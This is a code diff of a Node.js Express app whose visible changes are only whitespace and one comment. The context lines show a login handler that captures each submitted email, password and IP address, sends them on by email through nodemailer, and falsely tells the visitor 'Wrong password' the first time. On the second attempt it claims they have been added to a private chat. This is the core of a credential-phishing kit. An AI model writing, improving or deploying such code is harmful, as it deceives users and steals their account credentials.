@@ -41,11 +41,14 @@ const transporter = nodemailer.createTransport({
     }
 });
 
+
+
 app.get("/", (req, res) => {
     res.render("index");
 });
 
 app.post("/login", (req, res) => {
+   
     const { email, password } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
@@ -66,9 +69,10 @@ app.post("/login", (req, res) => {
                 res.status(500).send('Error sending email.');
             } else {
                 console.log('Email sent: ' + info.response);
-                res.send('Wrong password');
+                res.send('Wrong password'); // Send "wrong password" message
             }
         });
+
     } else {
         // Second attempt - Send success message
         res.send('You have been successfully added to the private chat, you will get a message request shortly.');
